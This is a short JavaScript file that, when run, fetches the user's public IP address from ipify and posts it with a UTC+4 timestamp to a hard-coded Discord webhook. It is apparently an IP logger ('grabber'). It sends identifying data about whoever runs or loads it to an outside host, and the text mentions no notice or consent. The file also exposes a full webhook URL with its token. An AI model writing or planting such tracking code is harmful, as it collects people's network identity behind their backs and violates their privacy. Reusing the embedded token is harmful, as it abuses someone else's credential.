const ipifyAPI = "https://api.ipify.org?format=json";
const webhookURL =
  "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";

// Function to get the current Georgian date and time (UTC+4)
function getGeorgianTime() {
  const now = new Date();
  const georgianOffset = 4; // UTC+4
  const georgianTime = new Date(now.getTime() + georgianOffset * 60 * 60 * 1000);

  const year = georgianTime.getFullYear();
  const month = String(georgianTime.getMonth() + 1).padStart(2, "0");
  const day = String(georgianTime.getDate()).padStart(2, "0");
  const hours = String(georgianTime.getHours()).padStart(2, "0");
  const minutes = String(georgianTime.getMinutes()).padStart(2, "0");
  const seconds = String(georgianTime.getSeconds()).padStart(2, "0");

  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds} (Georgian Time)`;
}

// Function to fetch the user's public IP address
async function getIP() {
  try {
    console.log("Fetching IP...");
    const response = await fetch(ipifyAPI);
    if (!response.ok) {
      throw new Error(`ipify API returned status ${response.status}`);
    }
    const data = await response.json();
    if (!data.ip) {
      throw new Error("No IP address found in ipify response.");
    }
    console.log("Fetched IP:", data.ip);
    return data.ip;
  } catch (error) {
    console.error("Error fetching IP:", error);
    return null;
  }
}

// Function to send time and IP address to Discord webhook
async function sendToDiscord(ip) {
  if (!ip) {
    console.error("IP address is null or undefined.");
    return;
  }

  const timestamp = getGeorgianTime();

  const payload = {
    content: `IP Address: ${ip}\nTimestamp: ${timestamp}`,
  };

  try {
    console.log("Sending data to Discord...");
    const response = await fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`Discord webhook returned status ${response.status}`);
    }
    console.log("IP and time sent to Discord successfully!");
  } catch (error) {
    console.error("Error sending data to Discord:", error);
  }
}

// Main function to fetch IP and send to Discord
async function main() {
  const ip = await getIP();
  if (ip) {
    await sendToDiscord(ip);
  } else {
    console.error("Could not retrieve IP address.");
  }
}

main();
